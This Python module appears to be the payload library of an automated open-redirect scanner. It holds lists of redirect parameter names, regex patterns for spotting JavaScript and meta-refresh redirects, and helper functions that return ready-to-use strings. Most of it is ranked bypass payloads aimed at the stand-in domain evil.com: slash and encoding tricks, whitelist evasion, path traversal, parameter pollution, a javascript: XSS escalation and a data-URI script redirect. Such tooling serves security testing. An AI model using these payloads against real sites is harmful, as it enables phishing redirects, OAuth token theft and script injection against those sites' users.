"""
Open Redirect Payload Library

Centralized collection of:
- Redirect parameter names (140+ from Nuclei fuzzing templates)
- Ranked exploitation payloads (by success rate)
- JavaScript redirect detection patterns
- Path-based redirect patterns

Sources:
- Nuclei fuzzing templates (140+ params)
- PayloadsAllTheThings
- HackTricks Open Redirect guide
- SwisskyRepo exploitation research
"""

from typing import List, Dict

# Common redirect parameter names from Nuclei templates and security research
# Categorized by frequency/likelihood of being redirect controls
REDIRECT_PARAMS: List[str] = [
    # Tier 1: Standard redirect parameters (highest frequency)
    "url", "redirect", "redirect_url", "redirect_uri", "redirectUrl", "redirectUri",
    "return", "returnTo", "return_to", "return_url", "returnUrl", "returnURL",
    "next", "next_url", "nextUrl", "nextURL",
    "dest", "destination", "dest_url", "destUrl",
    "goto", "go", "go_to", "goTo",
    "target", "target_url", "targetUrl",
    "redir", "redir_url", "redirUrl",
    "out", "outUrl", "out_url",

    # Tier 2: Navigation parameters
    "link", "linkUrl", "link_url",
    "to", "toUrl", "to_url",
    "view", "viewUrl", "view_url",
    "forward", "forward_url", "forwardUrl",
    "ref", "referer", "referrer",
    "u", "r", "l",

    # Tier 3: Authentication flow parameters
    "continue", "continueUrl", "continue_url",
    "success_url", "successUrl", "success",
    "failure_url", "failureUrl", "failure",
    "callback", "callback_url", "callbackUrl",
    "oauth_callback", "oauth_redirect",
    "login_redirect", "loginRedirect",
    "logout_redirect", "logoutRedirect",
    "auth_redirect", "authRedirect",
    "sso_redirect", "ssoRedirect",

    # Tier 4: E-commerce parameters
    "checkout_url", "checkoutUrl",
    "return_path", "returnPath",
    "success_target", "successTarget",
    "cancel_url", "cancelUrl",
    "back", "back_url", "backUrl",

    # Tier 5: Less common but valid
    "image_url", "imageUrl", "img_url", "imgUrl",
    "feed", "feed_url", "feedUrl",
    "host", "port", "path",
    "reference", "site", "site_url", "siteUrl",
    "jump", "jump_url", "jumpUrl",
    "service", "service_url", "serviceUrl",
    "exit", "exit_url", "exitUrl",
    "file", "file_url", "fileUrl",
    "page", "page_url", "pageUrl",
    "data", "data_url", "dataUrl",
    "location", "loc",
    "uri", "URI",
    "href", "hrefUrl",
    "src", "source",

    # Tier 6: Framework-specific
    "RelayState",  # SAML
    "SAMLRequest", "SAMLResponse",
    "state",  # OAuth
    "redirect_after_login",
    "redirect_after_logout",
    "post_login_redirect",
    "post_logout_redirect",
    "error_redirect",
    "ReturnUrl",  # ASP.NET
    "spring-redirect:",  # Spring
    "wicket:pageMapName",  # Wicket

    # Tier 7: CMS-specific
    "wp_redirect",  # WordPress
    "redirect_to",  # Drupal/Django
    "destination",  # Drupal
    "q",  # Drupal
    "action",

    # Tier 8: Encoded/obfuscated variants
    "URL", "REDIRECT", "RETURN", "NEXT", "GOTO", "TARGET",
    "Redirect", "Return", "Next", "Goto", "Target",
    "rUrl", "redir_to", "rd", "redirect_path",
]


# Exploitation payloads ranked by success rate (stop on first success)
# Attacker domain placeholder: {attacker} will be replaced at runtime
RANKED_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
    # Tier 1: Protocol-relative (highest success rate ~60%)
    "basic": [
        {"payload": "//{attacker}", "technique": "protocol_relative", "desc": "Most common bypass"},
        {"payload": "https://{attacker}", "technique": "direct_url", "desc": "Direct external URL"},
        {"payload": "///{attacker}", "technique": "triple_slash", "desc": "Triple slash bypass"},
        {"payload": "////{attacker}", "technique": "quad_slash", "desc": "Quad slash bypass"},
        {"payload": "\\/\\/{attacker}", "technique": "backslash_escape", "desc": "Backslash confusion"},
        {"payload": "/\\/{attacker}", "technique": "mixed_slash", "desc": "Mixed slash bypass"},
    ],

    # Tier 2: Encoding bypasses (~30% success)
    "encoding": [
        {"payload": "https://{attacker}%E3%80%82com", "technique": "unicode_dot", "desc": "Unicode fullwidth dot (U+3002)"},
        {"payload": "%2f%2f{attacker}", "technique": "url_encoded_slash", "desc": "URL-encoded double slash"},
        {"payload": "%252f%252f{attacker}", "technique": "double_encoded", "desc": "Double URL-encoded"},
        {"payload": "https:/\\/{attacker}", "technique": "backslash_url", "desc": "Backslash in URL"},
        {"payload": "https:\\/{attacker}", "technique": "backslash_scheme", "desc": "Backslash after scheme"},
        {"payload": "https:\\/\\/{attacker}", "technique": "mixed_backslash", "desc": "Mixed backslash escape"},
        {"payload": "//{attacker}%00", "technique": "null_byte", "desc": "Null byte injection"},
        {"payload": "//{attacker}%0d%0a", "technique": "crlf", "desc": "CRLF injection (header injection escalation)"},
    ],

    # Tier 3: Whitelist bypasses (~20% success) - requires {trusted} placeholder
    "whitelist": [
        {"payload": "https://{trusted}@{attacker}", "technique": "userinfo", "desc": "@ symbol userinfo abuse"},
        {"payload": "https://{trusted}.{attacker}", "technique": "subdomain", "desc": "Subdomain trick"},
        {"payload": "{attacker}#{trusted}", "technique": "fragment", "desc": "Fragment confusion"},
        {"payload": "{attacker}?{trusted}", "technique": "query", "desc": "Query parameter confusion"},
        {"payload": "{attacker};{trusted}", "technique": "semicolon", "desc": "Semicolon confusion"},
        {"payload": "https://{attacker}%23@{trusted}", "technique": "encoded_fragment", "desc": "Encoded hash in userinfo"},
        {"payload": "https://{attacker}%00.{trusted}", "technique": "null_subdomain", "desc": "Null byte subdomain"},
    ],

    # Tier 4: Path traversal and advanced (~10% success)
    "advanced": [
        {"payload": "https://{trusted}/../{attacker}", "technique": "path_traversal", "desc": "Path traversal"},
        {"payload": "https://{trusted}/../../{attacker}", "technique": "double_traversal", "desc": "Double path traversal"},
        {"payload": "https://{trusted}/%2e%2e%2f{attacker}", "technique": "encoded_traversal", "desc": "Encoded path traversal"},
        {"payload": "javascript:alert(document.domain)//https://{trusted}", "technique": "javascript_xss", "desc": "XSS escalation via javascript:"},
        {"payload": "data:text/html,<script>location='{attacker}'</script>", "technique": "data_uri", "desc": "Data URI redirect"},
        {"payload": "//[{attacker}]", "technique": "ipv6_bracket", "desc": "IPv6 bracket notation"},
    ],
}

# HTTP Parameter Pollution variants (test when standard payloads fail)
HPP_PAYLOADS: List[Dict[str, str]] = [
    {"pattern": "?{param}={trusted}&{param}={attacker}", "technique": "hpp_append"},
    {"pattern": "?{param}={attacker}&{param}={trusted}", "technique": "hpp_prepend"},
    {"pattern": "?{param}[]={trusted}&{param}[]={attacker}", "technique": "hpp_array"},
]

# JavaScript redirect patterns for Hunter phase (regex patterns)
JS_REDIRECT_PATTERNS: List[Dict[str, str]] = [
    {"pattern": r"window\.location\s*=\s*['\"]([^'\"]+)['\"]", "name": "window_location_assign"},
    {"pattern": r"window\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", "name": "window_location_href"},
    {"pattern": r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", "name": "location_href"},
    {"pattern": r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]\s*\)", "name": "location_replace"},
    {"pattern": r"document\.location\s*=\s*['\"]([^'\"]+)['\"]", "name": "document_location"},
    {"pattern": r"location\.assign\s*\(\s*['\"]([^'\"]+)['\"]\s*\)", "name": "location_assign"},
    # Dynamic patterns (user input in redirect)
    {"pattern": r"window\.location\s*=\s*[\w\.]+", "name": "window_location_dynamic"},
    {"pattern": r"location\.href\s*=\s*[\w\.]+\s*\+", "name": "location_href_concat"},
]

# Meta refresh patterns
META_REFRESH_PATTERN = r'<meta[^>]*http-equiv=["\']?refresh["\']?[^>]*content=["\']?\d+;\s*url=([^"\'>\s]+)'

# Path-based redirect patterns (URL path segments that suggest redirect functionality)
PATH_PATTERNS: List[str] = [
    "/redirect/",
    "/redirect?",
    "/redir/",
    "/goto/",
    "/go/",
    "/out/",
    "/link/",
    "/external/",
    "/url/",
    "/outbound/",
    "/proxy/",
    "/forward/",
    "/jump/",
    "/click/",
    "/track/",
    "/exit/",
]

# HTTP redirect status codes
REDIRECT_STATUS_CODES = {301, 302, 303, 307, 308}

# Default attacker domain for testing (can be overridden)
DEFAULT_ATTACKER_DOMAIN = "evil.com"
DEFAULT_ATTACKER_DOMAIN_INTERACTSH = "{unique}.interact.sh"  # For OOB validation


def get_payloads_for_tier(tier: str, attacker: str = DEFAULT_ATTACKER_DOMAIN, trusted: str = None) -> List[str]:
    """
    Get payloads for a specific tier with placeholders replaced.

    Args:
        tier: Payload tier (basic, encoding, whitelist, advanced)
        attacker: Attacker-controlled domain
        trusted: Trusted domain for whitelist bypasses (required for whitelist tier)

    Returns:
        List of ready-to-use payload strings
    """
    if tier not in RANKED_PAYLOADS:
        return []

    payloads = []
    for p in RANKED_PAYLOADS[tier]:
        payload = p["payload"].replace("{attacker}", attacker)
        if trusted and "{trusted}" in payload:
            payload = payload.replace("{trusted}", trusted)
        elif "{trusted}" in payload:
            continue  # Skip whitelist payloads if no trusted domain provided
        payloads.append(payload)

    return payloads


def get_all_payloads(attacker: str = DEFAULT_ATTACKER_DOMAIN, trusted: str = None) -> List[str]:
    """Get all payloads across all tiers in ranked order."""
    all_payloads = []
    for tier in ["basic", "encoding", "whitelist", "advanced"]:
        all_payloads.extend(get_payloads_for_tier(tier, attacker, trusted))
    return all_payloads
